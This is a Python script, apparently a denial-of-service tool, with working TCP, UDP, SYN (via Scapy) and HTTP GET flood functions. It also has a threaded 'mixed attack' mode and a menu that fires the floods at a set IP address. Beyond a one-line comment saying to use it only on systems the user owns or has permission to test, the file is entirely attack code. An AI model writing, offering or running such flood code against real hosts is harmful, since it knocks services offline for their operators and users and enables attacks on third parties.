import socket
import random
import time
import threading
from scapy.all import *
from faker import Faker

fake = Faker()

class DDoSTrafficGenerator:
    def __init__(self, target_ip, target_port=80, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.stop_flag = False
        
    def tcp_flood(self):
        """Generate TCP flood traffic"""
        print(f"Starting TCP flood to {self.target_ip}:{self.target_port}")
        start_time = time.time()
        
        while time.time() - start_time < self.duration and not self.stop_flag:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target_ip, self.target_port))
                s.sendto(("GET / HTTP/1.1\r\n").encode(), (self.target_ip, self.target_port))
                s.close()
            except:
                pass
            time.sleep(0.01)  # Adjust for attack intensity
            
    def udp_flood(self):
        """Generate UDP flood traffic"""
        print(f"Starting UDP flood to {self.target_ip}:{self.target_port}")
        start_time = time.time()
        
        while time.time() - start_time < self.duration and not self.stop_flag:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (self.target_ip, self.target_port))
                s.close()
            except:
                pass
            time.sleep(0.01)
            
    def syn_flood(self):
        """Generate SYN flood using Scapy"""
        print(f"Starting SYN flood to {self.target_ip}:{self.target_port}")
        start_time = time.time()
        
        while time.time() - start_time < self.duration and not self.stop_flag:
            ip = IP(dst=self.target_ip)
            tcp = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags="S")
            send(ip/tcp, verbose=0)
            time.sleep(0.001)  # Very fast for SYN flood
            
    def http_flood(self):
        """Generate HTTP GET flood"""
        print(f"Starting HTTP flood to {self.target_ip}:{self.target_port}")
        start_time = time.time()
        user_agents = [fake.user_agent() for _ in range(50)]
        urls = ["/", "/index.html", "/api/v1/test", "/wp-admin", "/images/logo.png"]
        
        while time.time() - start_time < self.duration and not self.stop_flag:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target_ip, self.target_port))
                
                # Craft HTTP request
                request = (f"GET {random.choice(urls)} HTTP/1.1\r\n"
                          f"Host: {self.target_ip}\r\n"
                          f"User-Agent: {random.choice(user_agents)}\r\n"
                          f"Accept: text/html,application/xhtml+xml\r\n"
                          f"Connection: keep-alive\r\n\r\n")
                
                s.send(request.encode())
                s.close()
            except:
                pass
            time.sleep(0.05)
    
    def mixed_attack(self):
        """Generate mixed attack traffic"""
        print(f"Starting mixed DDoS attack to {self.target_ip}")
        start_time = time.time()
        
        while time.time() - start_time < self.duration and not self.stop_flag:
            attack_type = random.choice([self.tcp_flood, self.udp_flood, self.syn_flood, self.http_flood])
            threading.Thread(target=attack_type).start()
            time.sleep(0.5)
    
    def stop(self):
        """Stop all attacks"""
        self.stop_flag = True

if __name__ == "__main__":
    # WARNING: Only use against systems you own or have permission to test!
    TARGET_IP = "192.168.0.13"  # Change to your test server IP
    DURATION = 10  # Attack duration in seconds
    
    generator = DDoSTrafficGenerator(TARGET_IP, duration=DURATION)
    
    print("Select attack type:")
    print("1. TCP Flood")
    print("2. UDP Flood")
    print("3. SYN Flood")
    print("4. HTTP Flood")
    print("5. Mixed Attack")
    
    choice = input("Enter attack type (1-5): ")
    
    try:
        if choice == "1":
            generator.tcp_flood()
        elif choice == "2":
            generator.udp_flood()
        elif choice == "3":
            generator.syn_flood()
        elif choice == "4":
            generator.http_flood()
        elif choice == "5":
            generator.mixed_attack()
        else:
            print("Invalid choice")
    except KeyboardInterrupt:
        generator.stop()
        print("\nAttack stopped by user")